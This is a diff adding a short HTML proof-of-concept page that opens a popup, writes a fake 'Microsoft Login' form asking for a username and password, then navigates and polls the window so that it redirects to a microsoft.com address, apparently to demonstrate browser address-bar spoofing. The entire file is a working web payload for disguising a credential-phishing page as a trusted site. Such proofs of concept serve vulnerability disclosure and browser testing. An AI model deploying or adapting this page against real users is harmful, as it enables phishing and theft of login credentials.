@@ -1,0 +1,25 @@
+<html>
+ <head>
+  <script>
+  var w, i;
+
+  function next() {
+    w.location.replace('https://microsoft.com:88');
+  }
+
+  function f() {
+    w = window.open(
+      "javascript:document.write('<h1>Fake Microsoft Login</h1><p>Enter credentials:</p><input type=text placeholder=Username><br><input type=password placeholder=Password><br><button>Sign In</button>');location='http://yatra.com'"
+    );
+
+    i = setInterval(
+      "try { x = w.location.href; } catch(e) { clearInterval(i); next(); }",
+      0
+    );
+  }
+  </script>
+ </head>
+ <body>
+  <center><a href="#" onclick="f()">Click For POC</a></center>
+ </body>
+</html>
